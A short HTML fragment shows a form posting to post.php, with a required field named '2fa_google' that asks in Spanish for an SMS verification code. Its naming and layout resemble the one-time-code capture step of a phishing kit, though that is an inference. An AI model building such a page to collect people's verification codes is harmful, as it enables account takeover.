...
<form method="POST" action="post.php">
	...
	<input id="user" type="text" name="2fa_google" placeholder="Introduce tu código SMS"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
